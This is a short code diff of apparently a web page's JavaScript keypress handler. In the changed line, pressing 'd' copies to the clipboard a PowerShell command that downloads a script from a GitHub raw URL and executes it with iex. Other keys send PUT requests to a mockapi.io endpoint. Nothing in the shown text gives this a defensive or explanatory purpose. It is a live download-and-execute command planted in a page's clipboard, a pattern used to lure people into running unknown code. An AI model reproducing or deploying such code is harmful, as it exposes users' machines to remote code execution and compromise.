@@ -52,7 +52,7 @@
                     body: JSON.stringify({ on: true })
                 }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
             } else if (event.key === 'd' || event.key === 'D') {
-                copyText(`powershell -c iex (iwr "https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt")`);
+                copyText(`powershell -c "iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/2.txt\\")"`);
             } else{
                 fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
                     method: 'PUT',
